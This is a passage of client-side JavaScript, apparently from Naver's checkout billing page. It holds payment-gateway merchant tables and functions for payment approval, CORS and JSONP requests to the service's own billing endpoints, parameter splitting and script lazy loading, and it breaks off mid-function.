ubmid":"naver_shoppay26","pgid":"01030","mid":"naver_shoppay26","minamt":"300000"},"51263C002":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"100000"},"51263C010":{"submid":"naver_order12","pgid":"51264","mid":"naver_order12","minamt":"300000"},"01051CH10":{"submid":"naver_local02","pgid":"01052","mid":"naver_local02","minamt":"300000"},"51305CH10":{"submid":"naver_PG50","pgid":"51311","mid":"naver_PG50","minamt":"300000"},"51257C010":{"submid":"naver_local04","pgid":"51258","mid":"naver_local04","minamt":"300000"},"51269CH10":{"submid":"naver_PG36","pgid":"51275","mid":"naver_PG36","minamt":"300000"},"51104CH06":{"submid":"naver_shoppay54","pgid":"51105","mid":"naver_shoppay54","minamt":"100000"},"51270C010":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"300000"},"51247CH10":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"300000"},"51253CH06":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"100000"},"51296CH06":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"100000"},"51300C010":{"submid":"naver_PG44","pgid":"51301","mid":"naver_PG44","minamt":"300000"},"51281CH10":{"submid":"naver_booking12","pgid":"51282","mid":"naver_booking12","minamt":"300000"},"51279C003":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51279C006":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"200000"},"51270C006":{"submid":"naver_PG38","pgid":"51276","mid":"naver_PG38","minamt":"200000"},"51247CH06":{"submid":"naver_PG19","pgid":"51248","mid":"naver_PG19","minamt":"100000"},"51074CH06":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"100000"},"51279C002":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"100000"},"51078C010":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"300000"},"51221C010":{"submid":"naver_shoppay69","pgid":"51222","mid":"naver_shoppay69","minamt":"300000"},"51253CH10":{"submid":"naver_booking08","pgid":"51254","mid":"naver_booking08","minamt":"300000"},"01045CH06":{"submid":"naver_booking02","pgid":"01046","mid":"naver_booking02","minamt":"100000"},"51285C010":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"300000"},"51296CH10":{"submid":"naver_PG61","pgid":"51298","mid":"naver_PG61","minamt":"300000"},"01067CH10":{"submid":"naver_order24","pgid":"01068","mid":"naver_order24","minamt":"300000"},"51285C006":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"200000"},"51074CH10":{"submid":"naver_shoppay39","pgid":"51075","mid":"naver_shoppay39","minamt":"300000"},"51080CH06":{"submid":"naver_shoppay32","pgid":"51081","mid":"naver_shoppay32","minamt":"100000"},"51219CH06":{"submid":"naver_shoppay67","pgid":"51220","mid":"naver_shoppay67","minamt":"100000"},"51285C003":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51078C006":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"200000"},"51285C002":{"submid":"naver_order18","pgid":"51286","mid":"naver_order18","minamt":"100000"},"51078C002":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51078C003":{"submid":"naver_shoppay30","pgid":"51079","mid":"naver_shoppay30","minamt":"100000"},"51108C010":{"submid":"naver_shoppay61","pgid":"51111","mid":"naver_shoppay61","minamt":"300000"},"51279C010":{"submid":"naver_smartstore08","pgid":"51280","mid":"naver_smartstore08","minamt":"300000"}}',
						_lastCallbackFn : $H({}),
						_returnForm : $H({}),
						_returnCommonForm : $H({}),
						_macRurl : "",
						_asyncCipherUrl : "http://billing.checkout.naver.com/pay/asyncEncrypt.nhn",
						_asyncCipherWithCorsUrl : "http://billing.checkout.naver.com/pay/asyncEncryptWithCors.nhn",
						_device : "PC",
						_oneClickCardInfo : '',
						_oneClickCardPgInfo : '{"C5MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C4MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CFMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CHPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CFPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CHMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C1MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CPMOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C7MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C9PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C9MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C7PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C0MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C3MOBILE":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C5PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C4PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C3PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C1PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"C0PC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"},"CPPC":{"submid":"naver_smartstore05","pgid":"51277","mid":"naver_smartstore05","ranking":"0"}}',
						_oneClickBankInfo : '',
						_removeAccountUrl : 'http://billing.checkout.naver.com/pay/removeAccount.nhn', 
						_getAccountInfoUrl : 'http://billing.checkout.naver.com/pay/getAccountInfo.nhn',
						_getOneClickCardInfoUrl : 'http://billing.checkout.naver.com/pay/getOneClickCardInfo.nhn',
						_svctype :  "C2",
						_usePending : "Y"
					};
					
					bill.init = function(pgid) {
						if( !this.variable._bInit ) {
							this.variable._init();
							var _pgFrm = $Form(this.variable._formPG.$(pgid));
						}
							
						if(this.variable._initPG.hasKey(pgid)){
							var initFn = this.variable._initPG.$(pgid);
							return initFn();	
						}
							
						return false;
					};
					
					bill.initAccountInfo = function(callback, ckey){
						bill.commonTransferData(bill.variable._getAccountInfoUrl,$H({rsvseq : '6261708841', chnl : 'NV', userkey : '238621119', 'ckey': ckey, NAMES :"rsvseq, chnl, userkey, ckey"})
								, function(result){
								if( result == 'error'){
									callback(false);
								} else{				
									bill.variable._oneClickBankInfo = $H({resultCode: result.resultCode, bnkCd: result.value});
									callback(true);
								}			
							})		
					}
					
					bill.initOneClickCardInfo = function(callback, ckey){
						bill.commonTransferData(bill.variable._getOneClickCardInfoUrl,$H({rsvseq : '6261708841', chnl : 'NV', userkey : '238621119', 'ckey': ckey, NAMES :"rsvseq, chnl, userkey"})
								, function(result){
								if( result == 'error'){
									alert('카드정보를 불러오는 중에 오류가 발생했습니다.');
									callback(false);
								} else{				
									bill.variable._oneClickCardInfo = result;
									callback(true);
								}			
							})		
					}
					
					bill.oneClickCardSeq = function(cardCd) {
						return $Json(this.variable._oneClickCardInfo).get(cardCd);
					}
					
					bill.findOneClickCardInfo = function(cardCd) {
						for(i = 0;i < bill.variable._oneClickCardInfo.cardList.length; i++) {
							var value = bill.variable._oneClickCardInfo.cardList[i];
							if(value.billingCardCode === cardCd) {
								return value.cid;
							}	
						}	
					}
					
					bill.makeClientseq = function() {
						var tmp_dt = new Date();
						return '' + tmp_dt.getMinutes() + tmp_dt.getSeconds() + tmp_dt.getMilliseconds() + Math.floor(Math.random()*1001);
					};
					
					bill.approval = function(commonFrm, callbackFn, callbackFn2) {
						if( !this.variable._bInit ) {
							this.variable._init();
						}
						var _cmFrm = $Form(commonFrm);
						_cmFrm.value('MSG', '');
						_cmFrm.value('APPROVALSEQ', '');
						_cmFrm.value('ACCTNO', '');
						_cmFrm.value('ENDDATE', '');
						_cmFrm.value('BALANCE', '');
						_cmFrm.value('SPLITPARAM', '');
						_cmFrm.value('SPLITYN', 'N');
						_cmFrm.value('CLIENTSEQ', this.makeClientseq());
						_cmFrm.value('RSVSEQ', '6261708841');
						_cmFrm.value('CHNL', 'NV');
						_cmFrm.value('USERID', 'kikim0090');
						_cmFrm.value('USERKEY', '238621119');
						_cmFrm.value('CPID', '50000097');
						_cmFrm.value('ITEMID', '50003125');
						_cmFrm.value('SID', '15232492367');
						_cmFrm.value('AMT', this.delComma(_cmFrm.value('AMT')));
						if (_cmFrm.value('SURL') == ""){
							_cmFrm.value('SURL', this.variable._mobileSurl);
						} else {
							_cmFrm.value('SURL', _cmFrm.value('SURL'));
						}
						_cmFrm.value('RURL', _cmFrm.value('RURL'));
						_cmFrm.value('CURL', _cmFrm.value('CURL'));
						if (_cmFrm.value('MACRURL') == ""){
							_cmFrm.value('MACRURL', this.variable._macRurl);
						} else {
							_cmFrm.value('MACRURL', _cmFrm.value('MACRURL'));
						}
						_cmFrm.value('USEPENDING', this.variable._usePending);
						
						var pgid = _cmFrm.value('PGID');
						if(!this.variable._formPG.hasKey(pgid) || !this.variable._approvalPG.hasKey(pgid) ){
							_cmFrm.value('MSG', '결제수단 오류입니다.');
							callbackFn(_cmFrm.$value());
							return false;
						}
						var _pgFrm = $Form(bill.variable._formPG.$(pgid));
						$A(_cmFrm.element()).forEach(function(value, index, array) { 
							var el = $Element(value);
							_pgFrm.value(el.attr('name'), el.attr('value'));
						});
						
						//PG call
						var self = this;
						var approvalFn = this.variable._approvalPG.$(pgid);
						setTimeout(function() {
							approvalFn.apply(self, [_cmFrm, _pgFrm, function(pgResult) {
								if (pgResult == 'success') {
									if (_cmFrm.value('LOSTPWCHANGEFG') == "Y") {
										_cmFrm.value('MSG', 'success');
										callbackFn(_cmFrm.$value());
									} else {
										var oAjaxQueue = new $Ajax.Queue({   
											 stopOnFailure : false
										}); 
										self.approvalAjaxCallSplit(oAjaxQueue, _pgFrm, self.variable._maxTxtSize);
										oAjaxQueue.add(self.approvalAjaxCallJsonp(_cmFrm, callbackFn),$S(_pgFrm.serialize()).parseString());
										oAjaxQueue.request();
									}
								} else if ( pgResult == 'installerror'){
									_cmFrm.value('MSG','모듈이 설치되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								} else if (pgResult == 'virnocallerror') {
									_cmFrm.value('MSG','카드간편결제 승인처리가 되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'cierror'){
									_cmFrm.value('MSG','해당ID의 CI값을 올바르게 가져오지 못했습니다.');
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'mobilepreapprovalerror'){
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'nomatcherror'){
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'failmsg') {
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								} else {
									_cmFrm.value('MSG','결제가 처리되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								}
							}, callbackFn2]);
						},500);
					};
					
					bill.commonTransferDataWithJsonp = function commonTransferDataWithJsonp(url, map, callbackFn){
						  var params = '';
						  var names = map.$('NAMES');
							map.remove('NAMES');
							map.forEach(function printIt(value, key, object) {
								params+=key+'='+value+',';
							});
							params = params.substring(0,params.length-1);
						var oAjax = new $Ajax(url , {
							type : 'jsonp',
							method : 'get',
							async : false,
							onload : function(res) {
								var result = res.json();
								if( result[0].rtncd == '00' ) {
									callbackFn(result[0]);
								} else if(result[0].rtncd == '000'){
									callbackFn(result[0]);
								}else {
									callbackFn("error");
								}
							},
							onerror : function(res) {
								var result = res.json();
								callbackFn("error");
							}
						});
						
						oAjax.request({
							VALUES : params,
							NAMES : names
						});
					}
					
					
					
					bill.commonTransferData = function commonTransferData(url, map, callbackFn){
						 var xhr = bill.createCORSRequest('POST', url); 
						   if (!xhr) {
							bill.commonTransferDataWithJsonp(url, map, callbackFn);
							return;
						  }
						  var params = '';
						  var names = map.$('NAMES');
							map.remove('NAMES');
							map.forEach(function printIt(value, key, object) {
								params+=key+'='+value+',';
							});
							params = params.substring(0,params.length-1);
						 
						  xhr.onload = function() {
							var text = xhr.responseText;
							var parsed = JSON.parse(text);
							if( parsed[0].rtncd == '00' ) {
								callbackFn(parsed[0]);
							}else{
								alert(parsed[0].msg);
								callbackFn('error');
							}
						  };
						  xhr.onerror = function() {
							  callbackFn('error');
						  };
						  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
						  xhr.send('NAMES='+names+'&'+'VALUES='+params);
					}
					
					bill.createCORSRequest = function createCORSRequest(method, url) {
						  var xhr = new XMLHttpRequest();
						  if ("withCredentials" in xhr) {
							xhr.open(method, url, false);
							
						  } else if (typeof XDomainRequest != "undefined") {
							  return null;
						  } else {
							xhr = null;
						  }
						  return xhr;
						}
						
					bill.encryptWithCors = function encryptWithCors(method, pgcp, map, callbackFn) {
						  var url = this.variable._asyncCipherWithCorsUrl;
						  if(method == "dec"){
							  url += "?m=decrypt";
						  }
						  var xhr = this.createCORSRequest('POST', url);
						  if (!xhr) {
								this.encryptWithJsonp(method, pgcp, map, callbackFn);
								return;
						  }
						  var params = '';
						  var names = map.$('NAMES');
							map.remove('NAMES');
							map.forEach(function printIt(value, key, object) {
								params+=key+'='+value+',';
							});
							params = params.substring(0,params.length-1);
						  
						  xhr.onload = function() {
							var text = xhr.responseText;
							var parsed = JSON.parse(text);
							if( parsed[0].rtncd == '00' ) {
								callbackFn(parsed[0]);
							}else{
								callbackFn('error');
							}
						  };
					
						  xhr.onerror = function() {
							  callbackFn('error');
						  };
						  xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
						  xhr.send('NAMES='+names+'&'+'VALUES='+params+'&PGCP='+pgcp);
					}
					
					bill.encryptWithJsonp =  function encryptWithJsonp(method, pgcp, map, callbackFn){
						var params = '';
						var names = map.$('NAMES');
						map.remove('NAMES');
						map.forEach(function printIt(value, key, object) {
							params+=key+'='+value+',';
						});
						params = params.substring(0,params.length-1);
						var url = this.variable._asyncCipherUrl;
						if(method == "dec"){
							  url += "?m=decrypt";
						 }
						var oAjax = new $Ajax(url , {
							type : 'jsonp',
							method : 'get',
							async : false,
							onload : function(res) {
								var result = res.json();
								if( result[0].rtncd == '00' ) {
									callbackFn(result[0]);
								} else {
									callbackFn("error");
								}
							},
							onerror : function(res) {
								var result = res.json();
								callbackFn("error");
							}
						});
						
						oAjax.request({
							PGCP : pgcp,
							VALUES : params,
							NAMES : names
						});
					
					}
					
					
					bill.postApproval = function(commonFrm, callbackFn, callbackFn2) {
						if( !this.variable._bInit ) {
							this.variable._init();
						}
						var _cmFrm = $Form(commonFrm);
						var pgid = _cmFrm.value('PGID');
						
						if(!this.variable._formPG.hasKey(pgid) || !this.variable._approvalPG.hasKey(pgid) ){
							_cmFrm.value('MSG', '결제수단 오류입니다.');
							callbackFn(_cmFrm.$value());
							return false;
						}
						var _pgFrm = $Form(bill.variable._formPG.$(pgid));
						$A(_cmFrm.element()).forEach(function(value, index, array) { 
							var el = $Element(value);
							_pgFrm.value(el.attr('name'), el.attr('value'));
						});
						
						//PG call
						var self = this;
						var postApprovalFn = this.variable._postApprovalPG.$(pgid);
						
						setTimeout(function() {
							postApprovalFn.apply(self, [_cmFrm, _pgFrm, function(pgResult) {
								if (pgResult == 'success') {
									_cmFrm.value('MSG','2차인증 성공');
									self.postApprovalAjaxCallJsonp(_cmFrm, _pgFrm, callbackFn);
								} else if ( pgResult == 'installerror'){
									_cmFrm.value('MSG','모듈이 설치되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								} else if (pgResult == 'virnocallerror') {
									_cmFrm.value('MSG','카드간편결제 승인처리가 되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'cierror'){
									_cmFrm.value('MSG','해당ID의 CI값을 올바르게 가져오지 못했습니다.');
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'mobilepreapprovalerror'){
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'oneclickcreditregerror'){
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								} else if(pgResult == 'nomatcherror'){
									_cmFrm.value('MSG', _pgFrm.value('MSG'));
									callbackFn(_cmFrm.$value());
								}else {
									_cmFrm.value('MSG','결제가 처리되지 않았습니다.');
									callbackFn(_cmFrm.$value());
								}
							}, callbackFn2]);
						},500);
					};
					
					bill.approvalAjaxCallSplit = function(oAjaxQueue, pgForm, size) {
						var self = this;
						if( size < self.variable._minTxtSize ) {
							return false;
						}
						$A(pgForm.element()).forEach(function(value, index, array) { 
							var el = new $Element(value);
							var val = el.attr('value');
							if( el.attr('name') == 'SPLITPARAM') {
								$A.Continue();   
							}
							if( encodeURIComponent(val).length < size )  { 
								$A.Continue();   
							}
					
							var len = val.length; 
							var arrSize = Math.ceil(len/self.variable._chunkSize);
					
							var strArr = $A();
							var tmpStr = new $S('');
							var tmpLen = 0;
							for( var i = 0; i < arrSize ; i++) {
								var appndStr = val.substr(i*self.variable._chunkSize, self.variable._chunkSize);
								var appndLen = encodeURIComponent(appndStr).length;
								if( tmpLen + appndLen > self.variable._maxTxtSize ) {
										if( tmpLen > 0 ) {
											strArr.push(tmpStr);
										}
										tmpStr = new $S(appndStr);
										tmpLen = appndLen;
								} else {
										tmpStr = tmpStr + appndStr;
										tmpLen = tmpLen + appndLen;
								}
							}
							if( tmpLen > 0 ) {
								strArr.push(tmpStr);
							}
					
							for( var i = 0; i < strArr.length(); i++) {
								var oAjax = new $Ajax(self.variable._preCallUrl, {   
									type : 'jsonp',
									method : 'get',
									async : false,
									onload :  function(res){
										;
									}   
								});
								var prm = new $H();
								prm.add('rsvseq', pgForm.value('RSVSEQ'));
								prm.add('chnl', pgForm.value('CHNL'));
								prm.add('userkey', pgForm.value('USERKEY'));
								prm.add('pgid', pgForm.value('PGID'));
								prm.add('clientseq', pgForm.value('CLIENTSEQ'));
								prm.add('totsize', len);
								prm.add('totcnt', strArr.length());
								prm.add('curcnt', i);
								prm.add('key', el.attr('name'));
								prm.add('val', strArr.get(i));
								oAjaxQueue.add(oAjax, prm.$value());
							}	
							
							el.attr('value', '');
							pgForm.value('SPLITYN', 'Y');
							if (pgForm.value('SPLITPARAM').length > 0) {
								pgForm.value('SPLITPARAM', pgForm.value('SPLITPARAM')+',' );
							}
							pgForm.value('SPLITPARAM', pgForm.value('SPLITPARAM') + el.attr('name'));
						});
						if( pgForm.serialize().length > self.variable._maxTxtSize ) {
							self.approvalAjaxCallSplit(oAjaxQueue, pgForm, Math.ceil(size/2));
						}
					};
					
					bill.approvalAjaxCallJsonp = function(commonFrm, callbackFn) {
						var self = this;
						var oAjax = new $Ajax(self.variable._callUrl, {
							type : 'jsonp',
							method : 'get',
							async : false,
							onload : function(res) {
								var result = res.json();
								self.approvalCallBackSuccess($H(result[0]), commonFrm, callbackFn);			
							},
							onerror : function(res) {
								var result = res.json();
								self.approvalCallBackFail($H(result[0]), commonFrm, callbackFn);
							}
						});
						return oAjax;
					};
					
					bill.approvalCallBackSuccess = function(rtnMap, commonFrm, callbackFn){
						if( rtnMap.$('rtncd') == '00' ) {
							commonFrm.value('MSG',rtnMap.$('msg'));
							commonFrm.value('APPROVALSEQ', rtnMap.$('approvalseq'));			
							// account
							if( rtnMap.hasKey('acctno')) {
								commonFrm.value('CORPCD',rtnMap.$('corpcd'));
								commonFrm.value('ACCTNO',rtnMap.$('acctno'));
								commonFrm.value('ENDDATE',rtnMap.$('enddate'));
							}
							// mobile 
							if(rtnMap.hasKey('balance')) {
								commonFrm.value('BALANCE',rtnMap.$('balance'));
							}
							if(rtnMap.hasKey('authType')) {
								commonFrm.value('AUTHTYPE',rtnMap.$('authType'));
							}
							if(rtnMap.hasKey('ansimFlag')) {
								commonFrm.value('ANSIMFG',rtnMap.$('ansimFlag'));
							}
							if(rtnMap.hasKey('safeguard')) {
								commonFrm.value('SAFEFG',rtnMap.$('safeguard'));
							}
							if(rtnMap.hasKey('authno')) {// moblie
								commonFrm.value('AUTHNO',rtnMap.$('authno'));
							}
							if(rtnMap.hasKey('paykey')) {
								commonFrm.value('PAYKEY',rtnMap.$('paykey'));
							}
						} else {
							commonFrm.value('MSG', rtnMap.$('msg'));
						}
						callbackFn(commonFrm.$value());
					};
					
					bill.npcbCheckStr = function npcbCheckStr(pgcp, common) {
						var npcbStr = {
							pgcp: pgcp,
							pgid : common.value('PGID'),
							corpcd: common.value('CORPCD'),
							NAMES: "pgcp, pgid, corpcd"
						};
					
						return npcbStr;
					};
					
					bill.approvalCallBackFail = function(rtnMap, commonFrm, callbackFn) {
						commonFrm.value('MSG','인증오류 발생 ' + rtnMap.$('msg'));
						callbackFn(commonFrm.$value());
					};
					
					bill.postApprovalAjaxCallJsonp = function(commonFrm, pgFrm, callbackFn) {
						var self = this;
						
						var oAjax = new $Ajax(self.variable._postCallUrl, {
							type : 'jsonp',
							method : 'get',
							async : false,
							onload : function(res) {
								var result = res.json();
								self.postApprovalCallBackSuccess($H(result[0]), commonFrm, callbackFn);			
							},
							onerror : function(res) {
								var result = res.json();
								self.postApprovalCallBackFail($H(result[0]), commonFrm, callbackFn);
							}
						});
						oAjax.request({
							PGCP :  pgFrm.value('PGCP'),
							VALUES : 'APPROVALSEQ='+commonFrm.value('APPROVALSEQ')+',RSVSEQ='+commonFrm.value('RSVSEQ')+',mUserKey='+pgFrm.value('mUserKey'),
							NAMES : 'mUserKey'
						});
					};
					
					bill.postApprovalCallBackSuccess = function(rtnMap, commonFrm, callbackFn){
						if( rtnMap.$('rtncd') == '00' ) {
							commonFrm.value('MSG',rtnMap.$('msg'));
						} else {
							commonFrm.value('MSG', rtnMap.$('msg'));
						}
						callbackFn(commonFrm.$value());
					};
					
					bill.postApprovalCallBackFail = function(rtnMap, commonFrm, callbackFn) {
						commonFrm.value('MSG','2차인증오류 발생 ' + rtnMap.$('msg'));
						callbackFn(commonFrm.$value());
					};
					
					bill.delComma = function(num){
						var parseNum = 0;
						if(isNaN(num)) {
							if(!isNaN(num.replace(/,/gi,''))) {
								parseNum = num.replace(/,/gi,'');
							}
						} else {
							parseNum = num;
						}
						return parseInt(parseNum, 10)
					};
					
					bill.isIE = function() {
						var isIE = $Agent().navigator().ie;
						if (!!navigator.userAgent.match(/Trident.*rv:11\./)) {
							isIE = true;
						}
						return isIE;
					}
					
					bill.isIE11Mode = function() {
						if (document.documentMode >= 11) {
							return true;
						}
						return false;
					}
					
					bill.attachDivision = function(sDomain, sTgt, sId, sInnerHtml) {
						var elDoc = sDomain.document;
						var elDiv = elDoc.getElementById(sId);
						if(elDiv) {
							return false;
						} else {
							var elTgt = elDoc.getElementsByTagName(sTgt)[0];
							elDiv = elDoc.createElement("div");
							elDiv.id = sId;
							elDiv.innerHTML = sInnerHtml;
							elTgt.appendChild(elDiv);
							return true;
						}
					};
					
					bill.lazyLoading = {
						_bIE : $Agent().navigator().ie,
						_waLoading : $A([]),
						_waLoaded : $A([]),
						_whtScript : $H({}),
						_whtCallback : $H({})
					};
					
					bill.lazyLoading.load = function(sDomain, sTgt, sUrl, fCallback, sCharset) {
						var strKey = sDomain.name+":"+sUrl;
						if (typeof fCallback != "function") {
							fCallback = function(){};
						}
						this._queueCallback(strKey, fCallback);
						if (this._checkIsLoading(strKey)) {
							return false;
						}
						if (this._checkAlreadyLoaded(strKey)) {
							return true;
						}
						this._waLoading.push(strKey);
						
						var self = this;
						var elDoc = sDomain.document;
						var elTgt = elDoc.getElementsByTagName(sTgt)[0]; 
						var elScript = elDoc.createElement("script");
						elScript.type = "text/javascript";
						if(sCharset) {
							elScript.charset = sCharset;
						} 
						elScript.src = sUrl;
						this._whtScript.add(strKey, elScript);
						
						if (this._bIE && !bill.isIE11Mode()) {
							elScript.onreadystatechange = function() {
								if(this.readyState == "complete" || this.readyState == "loaded") {
									self._waLoaded.push(strKey);
									self._waLoading = self._waLoading.refuse(strKey);
									self._doCallback(strKey);
									this.onreadystatechange = null;
								}
							};		
						} else {
							elScript.onload = function() {
								self._waLoaded.push(strKey);
								self._waLoading = self._waLoading.refuse(strKey);
								self._doCallback(strKey);
							};
						}
						elTgt.appendChild(elScript);
						return true;
					};
					
					bill.lazyLoading._queueCallback = function(strKey, fCallback) {
						var aCallback = this._whtCallback.$(strKey);
						if (aCallback) {
							aCallback.push(fCallback);
						} else {
							this._whtCallback.$(strKey, [fCallback]);
						}
					};
					
					bill.lazyLoading._doCallback = function(strKey) {
						var aCallback = this._whtCallback.$(strKey).concat();
						for (var i = 0; i < aCallback.length; i++) {
							this._whtCallback.$(strKey).splice(i, 1);
							aCallback[i]();
						}
					};
					
					bill.lazyLoading.abort = function(sDomain, sUrl) {
						var strKey = sDomain.name+":"+sUrl;
						if (this._checkIsLoading(strKey)) {
							var elScript = this.getScriptElement(strKey);
							this._waLoading = this._waLoading.refuse(strKey);
							
							if (this._bIE && !bill.isIE11Mode()) {
								elScript.onreadystatechange = null;	
							} else {
								elScript.onload = null;
							}		
							$Element(elScript).leave();
							this._whtScript.remove(strKey);
							this._whtCallback.remove(strKey);
							return true;
						} else {
							return false;
						}
					};
					
					bill.lazyLoading._checkAlreadyLoaded = function(strKey) {
						return this._waLoaded.has(strKey);
					};
					
					bill.lazyLoading._checkIsLoading = function(strKey) {
						return this._waLoading.has(strKey);
					};
					
					bill.lazyLoading.getLoaded = function() {
						return this._waLoaded.$value();
					};
					
					bill.lazyLoading.getLoading = function() {
						return this._waLoading.$value();
					};
					
					 bill.lazyLoading.getScriptElement = function(strKey) {
						return this._whtScript.$(strKey) || null;
					};
					
					bill.checkMinAmt = function (amt, minamt) {
						if (bill.delComma(amt) < bill.delComma(minamt)) {
							return false;
						}
						return true;
					}
					
					bill.getCookie = function(cookieName) {
						var i, cookieArray = document.cookie.split(";");
						for (i = 0; i < cookieArray.length; i++) {
							var x = cookieArray[i].substr(0, cookieArray[i].indexOf("="));
							var y = cookieArray[i].substr(cookieArray[i].indexOf("=") + 1);
							x = x.split(/^\s+|\s+$/g).join("");
							if (x == cookieName) {
								return unescape(y);
							}
						}
					}
					
					bill.callVirNo = function(cardcd, pgcd, pgid, callbackFn) {
						var self = this;
						var oAjax = new $Ajax(self.variable._virCallUrl, {
							type : 'jsonp',
							method : 'get',
							async : false,
							onload : function(res) {
								var result = res.json();
								
								if( $H(result[0]).$('rtncd') == '00' ) {
									if(!($H(result[0]).hasKey('virtualno'))) {
										callbackFn("error");
									} else {
										callbackFn($H(result[0]).$('virtualno'));
									}
								} else {
									callbackFn("error");
								}			
							},
							onerror : function(res) {
								var result = res.json();
								callbackFn("error");
							}
						});
						oAjax.request({
							CHNL : 'NV',
							USERID : 'kikim0090',
							CARDCD : cardcd,
							PGCD : pgcd,
							PGID : pgid
						});
					}
					
					bill.getOneClickCardPg = function(cardcd, orgvalue, findvalue) {
						var device = this.variable._device;
						if (device == "MOBILE") {
							device = "MOBILE";
						} else {
							device = "PC";
						}
						var id = cardcd + device + "/" + findvalue;
						var newValue = $Json(this.variable._oneClickCardPgInfo).get(id);
						if (newValue == 'undefined' || newValue == '' || newValue == null || newValue == 'null') {
							return orgvalue;
						}
						return newValue;
					}
					
					bill.convertPg = function(pgid, cardcd, instmo, orgvalue, findvalue, amt) {
						var searchPattern = new RegExp('^51', 'i');
						if (searchPattern.test(pgid)) {
							pgid = bill.getOneClickCardPg(cardcd, pgid, 'pgid');
							if ( findvalue.indexOf('pgid') == 0) {
								orgvalue = pgid;
							} else if (findvalue.indexOf('mid') == 0) {
								orgvalue = bill.getOneClickCardPg(cardcd, orgvalue, 'mid');
							} else if (findvalue.indexOf('submid') == 0) {
								orgvalue = bill.getOneClickCardPg(cardcd, orgvalue, 'submid');
							}
						}
						
						var id = pgid + cardcd + instmo + "/" + findvalue;
						var newValue = $Json(this.variable._defermentPayList).get(id);
						
						if (newValue == 'undefined' || newValue == '' || newValue == null || newValue == 'null') {
							return orgvalue;
						}
						
						if (amt == 'undefined' || amt == '' || amt == null || amt == 'null') {
							return newValue;
						}
						
						var minAmtId = pgid + cardcd + instmo + "/minamt";
						var minAmt = $Json(this.variable._defermentPayList).get(minAmtId);
						if (minAmt == 'undefined' || minAmt == '' || minAmt == null || minAmt == 'null') {
							return newValue;
						}
						
						if (typeof amt != "number") {
							amt = amt * 1;
						}
						
						if (amt < minAmt) {
							return orgvalue;	
						}
						
						return newValue;
					}
					
					bill.convertPgId = function(pgid, cardcd, instmo, amt) {
						return bill.convertPg(pgid, cardcd, instmo, pgid, 'pgid', amt);
					}
					
					bill.convertPgMid = function(pgid, cardcd, instmo, mid, amt) {
						return bill.convertPg(pgid, cardcd, instmo, mid, 'mid', amt);
					}
					
					bill.convertPgSubMid = function(pgid, cardcd, instmo, submid, amt) {
						return bill.convertPg(pgid, cardcd, instmo, submid, 'submid', amt);
					}
					
					bill.isDefermentPay = function(orgPgid, cardcd, instmo, amt) {
						var pgid = orgPgid;
						var searchPattern = new RegExp('^51', 'i');
						if (searchPattern.test(orgPgid)) {
